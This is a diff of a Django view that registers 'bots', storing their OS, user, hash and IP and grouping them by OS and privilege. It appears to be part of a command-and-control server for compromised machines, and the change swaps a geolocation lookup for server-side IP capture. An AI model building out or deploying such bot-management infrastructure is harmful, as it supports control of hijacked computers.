@@ -4,6 +4,7 @@ from django.http import HttpResponse, Http404
 from django.views.decorators.csrf import csrf_exempt
 from django.utils import timezone
 from convey.models import Bot
+from convey.views.utils import get_ip
 
 # Determine a new bot's group based on OS and privilege
 def get_group(operating_sys, user):
@@ -27,17 +28,14 @@ def register(request):
             version = request.POST['version']
         else:
             version = None
+
         hash_type = request.POST['hash_type']
         hash_sum = request.POST['hash_sum']
         operating_sys = request.POST['operating_sys']
-        ip_addr = request.POST['ip_addr']
         user = request.POST['user']
+        ip_addr = get_ip(request)
         group = get_group(operating_sys, user)
         last_contact = timezone.now()
-
-        geo_html = urlopen('https://ipinfo.io/{}/geo'.format(ip_addr)).read().decode('utf-8')
-        geo_json = json.loads(geo_html)
-        geolocation = geo_json['country']
 
         bot = Bot.objects.create(
             version=version,
@@ -47,7 +45,6 @@ def register(request):
             operating_sys=operating_sys,
             user=user,
             ip_addr=ip_addr,
-            geolocation=geolocation,
             last_contact=last_contact,
         )
 
